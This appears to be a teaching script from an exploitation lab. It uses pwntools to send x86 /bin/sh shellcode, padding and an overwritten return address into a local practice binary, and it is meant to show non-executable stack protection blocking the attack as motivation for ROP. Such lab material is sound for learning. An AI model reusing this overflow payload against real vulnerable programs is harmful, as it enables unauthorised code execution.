#!/usr/bin/env python3
# =============================================================================
#  nx_shellcode_fails.py -- shows WHY we need ROP (the NX bit in action)
# =============================================================================
#
#  This is the "old school" attack that ROP replaces: put raw machine code
#  (shellcode) on the stack and redirect execution into it.
#
#  With NX enabled (as our Makefile builds it), the stack is non-executable.
#  The CPU refuses to run instructions fetched from a non-executable page and
#  raises a fault, so this attack dies with SIGSEGV instead of giving a shell.
#
#  That failure is the whole motivation for Return-Oriented Programming:
#  if you cannot run NEW code on the stack, you must REUSE existing executable
#  code -- which is exactly what exploit.py does.
#
#  Run:   python3 nx_shellcode_fails.py
#  Expect: the target receives SIGSEGV (no shell). That is the correct,
#          intended result -- it proves NX is doing its job.
# =============================================================================

from pwn import *

context.clear(arch='i386', os='linux')
context.log_level = 'info'

BINARY = './review_intake'
OFFSET = 84   # same offset as exploit.py

# Classic tiny execve("/bin/sh") shellcode for 32-bit x86.
shellcode = asm(shellcraft.i386.linux.sh())

def main():
    p = process(BINARY)

    # We would need the stack address of our buffer to jump to it. With ASLR
    # off and no PIE this is knowable, but it does not even matter here:
    # the point is that *executing stack bytes* is forbidden. We overwrite the
    # return address with a guess into the buffer region; NX makes any such
    # jump fault regardless of the exact address.
    payload  = shellcode
    payload += b'A' * (OFFSET - len(shellcode))
    payload += p32(0xffffd000)      # some stack-ish address (illustrative)

    p.sendlineafter(b'Choice: ',       b'1')
    p.sendlineafter(b'Product name: ', b'demo')
    p.sendlineafter(b'Rating (1-5): ', b'5')
    p.sendafter(b'> ',                 payload)

    p.wait()
    sig = p.poll()
    log.info("target exited with: %s", sig)
    if sig == -signal.SIGSEGV or (sig is not None and sig < 0):
        log.success("Target crashed (SIGSEGV) -- NX blocked the stack shellcode.")
        log.success("This is why we use ROP instead (see exploit.py).")
    else:
        log.failure("Unexpected: target did not crash as expected.")

if __name__ == '__main__':
    import signal
    main()
